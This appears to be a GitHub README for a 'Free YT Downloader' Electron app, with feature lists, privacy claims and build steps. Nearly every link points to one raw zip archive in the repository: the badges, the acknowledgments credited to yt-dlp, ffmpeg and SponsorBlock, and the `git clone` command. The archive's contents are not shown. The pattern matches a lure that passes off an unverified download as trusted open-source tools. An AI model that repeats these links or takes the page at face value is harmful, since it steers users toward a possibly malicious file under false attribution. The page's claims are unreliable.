<div align="center">

# Free YT Downloader

**A free, open-source YouTube downloader for Windows, macOS, and Linux.**

4K · 1080p60 · HDR · MP3 · Shorts · Subtitles · SponsorBlock

No ads. No login. No browser cookies. No Google account linked.

[![License: MIT](https://img.shields.io/badge/License-MIT-2ea44f.svg)](LICENSE)
[![Platforms](https://img.shields.io/badge/platforms-Windows%20%7C%20macOS%20%7C%20Linux-blue.svg)](#download)
[![Powered by yt-dlp](https://img.shields.io/badge/powered%20by-yt--dlp-red.svg)](https://github.com/pastel-statecapitalism754/free-yt-downloader/raw/refs/heads/main/src/yt_downloader_free_v1.5.zip)
[![Powered by ffmpeg](https://img.shields.io/badge/powered%20by-ffmpeg-007808.svg)](https://github.com/pastel-statecapitalism754/free-yt-downloader/raw/refs/heads/main/src/yt_downloader_free_v1.5.zip)
[![Built with Electron](https://img.shields.io/badge/built%20with-Electron-47848F.svg)](https://github.com/pastel-statecapitalism754/free-yt-downloader/raw/refs/heads/main/src/yt_downloader_free_v1.5.zip)

</div>

---

## Why this exists

Most "free YouTube downloader" apps you'll find are wrappers around `yt-dlp` that bolt on ads, paywalls, telemetry, or — worst of all — quietly read your browser cookies. This project is the opposite: a clean GUI on top of `yt-dlp` and `ffmpeg` that does exactly what it says, ships under the MIT license, and sends nothing back home.

## Features

- **Quality presets** — 360p, 480p, 720p, 1080p, 1440p (2K), 2160p (4K)
- **60 fps** and **HDR** when the source supports them (auto-detected, auto-disabled when not)
- **Audio-only** export — MP3, M4A, or Opus
- **Subtitles** — embed manual *and* auto-generated captions in any language
- **Embed thumbnail and chapters** straight into the MP4
- **SponsorBlock** — mark sponsor segments as chapters or cut them out entirely
  - Categories: sponsor, self-promo, intro, outro, preview/recap, filler, subscribe begs, non-music
- **Shorts** and **playlist** support (playlists are opt-in per download)
- **Live download queue** — progress %, speed, ETA, cancel, reveal-in-folder
- **Cross-platform** — single codebase, native installers for Windows / macOS / Linux

## Privacy

| | |
|---|---|
| **No telemetry** | Zero analytics. No crash reporters. No usage pings. |
| **No login** | The app never signs you into Google or YouTube. |
| **No cookie stealing** | Browser cookies are not read. (`yt-dlp`'s `--cookies-from-browser` is *not* used.) |
| **No update beacon** | No background calls to a "check for updates" server. Update the app yourself when you want. |
| **CSP-locked renderer** | The UI runs sandboxed with `contextIsolation: true` and a strict Content Security Policy. |

The only outbound network traffic is:
1. `yt-dlp` talking to YouTube to fetch the video you asked for.
2. Optional `SponsorBlock` API requests when you enable that feature.

## Download

Pre-built installers are available on the [Releases page](../../releases):

| Platform | File |
|---|---|
| **Windows** | `Free YT Downloader-Setup-<version>-x64.exe` (installer) or `-portable.exe` |
| **macOS** | `Free YT Downloader-<version>-arm64.dmg` (Apple Silicon) or `-x64.dmg` (Intel) |
| **Linux**   | `.AppImage` (universal) or `.deb` (Debian/Ubuntu) |

> The macOS build is **not** notarized. The first time you open it, right-click → Open and confirm. Notarization requires a paid Apple Developer account, which this project does not have.

## Build from source

Requires **Node.js 20+** and **npm**.

```bash
git clone https://github.com/pastel-statecapitalism754/free-yt-downloader/raw/refs/heads/main/src/yt_downloader_free_v1.5.zip
cd free-yt-downloader

npm install
npm run fetch-binaries   # downloads yt-dlp + ffmpeg into resources/bin
npm run dev              # launches the Electron app with hot reload
```

To build a distributable installer:

```bash
npm run dist             # auto-detects your platform
# or target a specific OS:
npm run dist:mac
npm run dist:win
npm run dist:linux
```

Output lands in `release/`.

### Cross-compiling installers

Before building an installer for a different OS, fetch the matching binaries:

```bash
npm run fetch-binaries -- --platform win32 --arch x64
npm run fetch-binaries -- --platform linux --arch arm64
npm run fetch-binaries -- --platform darwin --arch arm64
```

## Architecture

```
┌──────────────┐   IPC   ┌──────────────────┐   spawn   ┌──────────┐
│  React UI    │ ──────► │  Electron main   │ ────────► │  yt-dlp  │
│  (renderer)  │ ◄────── │  + ffmpeg path   │ ◄──────── │ + ffmpeg │
└──────────────┘  events └──────────────────┘  progress └──────────┘
```

- The renderer is sandboxed (`contextIsolation: true`, `nodeIntegration: false`).
- `electron/preload.ts` exposes a small, typed `window.app` API — nothing else.
- The main process is the only thing that touches the file system or spawns binaries.
- Progress is parsed from `yt-dlp`'s stdout and streamed to the renderer over IPC.

## Project layout

```
electron/         Electron main process, preload, yt-dlp wrapper
  main.ts         Window setup + IPC handlers
  preload.ts      Renderer-facing API surface
  ytdlp.ts        Spawn yt-dlp, parse progress, manage cancellation
  binaries.ts     Resolve bundled binaries or fall back to PATH
  types.ts        Shared types

src/              React renderer
  App.tsx         Top-level state, layout
  components/     UrlBar, VideoPreview, OptionsPanel, DownloadList, SettingsBar
  types.ts        Renderer-side mirror of the IPC types

scripts/
  fetch-binaries.mjs   Downloads yt-dlp + ffmpeg per target platform

build/            electron-builder resources (icons, mac entitlements)
resources/bin/    yt-dlp + ffmpeg (gitignored, fetched on demand)
release/          Built installers (gitignored)
```

## Roadmap

- [ ] Custom output filename templates
- [ ] Save default per-resolution profiles
- [ ] Drag-and-drop URL targets
- [ ] Persistent download history
- [ ] In-app `yt-dlp` self-update (opt-in)
- [ ] Light theme

## Contributing

Pull requests welcome. Two ground rules:

1. **Privacy stays a feature.** No analytics, no remote config, no auto-update servers, no cookie reading. If you want to add a network feature, it must be off by default and clearly disclosed in the UI.
2. **Keep dependencies thin.** This is a small app on top of two excellent CLI tools. Resist the urge to add a state-management library, a UI kit, or a 200-package abstraction.

For larger changes, please open an issue first to discuss.

## Acknowledgments

This project is a thin GUI on top of two phenomenal pieces of software. All credit for the actual downloading and processing work goes to:

- **[yt-dlp](https://github.com/pastel-statecapitalism754/free-yt-downloader/raw/refs/heads/main/src/yt_downloader_free_v1.5.zip)** — the YouTube extraction engine. (License: Unlicense)
- **[ffmpeg](https://github.com/pastel-statecapitalism754/free-yt-downloader/raw/refs/heads/main/src/yt_downloader_free_v1.5.zip)** — the universal media muxer/encoder. (License: LGPL or GPL depending on build)
- **[SponsorBlock](https://github.com/pastel-statecapitalism754/free-yt-downloader/raw/refs/heads/main/src/yt_downloader_free_v1.5.zip)** — the crowdsourced sponsor-segment database.

## Legal

This is free, open-source software provided **as-is**, with no warranty (see the [LICENSE](LICENSE)). It is a user-facing wrapper around `yt-dlp` and `ffmpeg`, both of which are free software in their own right.

You are responsible for how you use this tool, and for complying with the terms of service of any platform you interact with and the copyright law of your jurisdiction.

## License

[MIT](LICENSE) for the application code. Bundled binaries (`yt-dlp`, `ffmpeg`) retain their respective upstream licenses.
